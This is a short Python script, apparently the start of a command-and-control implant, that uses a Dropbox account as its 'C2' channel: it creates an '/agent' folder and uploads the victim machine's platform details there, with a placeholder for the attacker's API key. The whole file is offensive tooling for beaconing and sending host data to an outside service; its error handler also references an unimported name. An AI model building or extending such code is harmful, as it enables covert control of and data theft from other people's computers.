import dropbox
import json
import cmd
import platform

apiKey = "ADD YOUR API KEY HERE"

inf = "[*]"

def send_machine_name(drop, path):
    target = path + "/output.txt"
    with open("foo.txt", "w") as file:
        rr = str(platform.platform())
        file.write(rr)
    with open("foo.txt", "rb") as file:
        drop.files_upload(file.read(),target,mode=dropbox.files.WriteMode("overwrite"))

def path_exists(drop, path):
    try:
        drop.files_get_metadata(path)
        return True
    except ApiError as e:
        if e.error.get_path().is_not_found():
            return False
        raise

def main():
    #prelim data, setting the path and mode of writing
    path = "/agent"
    mode = (dropbox.files.WriteMode.overwrite)

    print(inf, "Initializing the Dropbox connection")
    db = dropbox.Dropbox(apiKey)
    
    print(inf, "Checking if \"Agent Folder\" exists")
    if not path_exists(db, path):
        print(inf, "Creating \"Agent Folder\"")
        db.files_create_folder("/agent")
    print(inf, "\"Agent Folder\" does exist")

    print(inf, "Sending machine name to \"C2\"")
    send_machine_name(db,path)

if __name__ == "__main__":
    main()




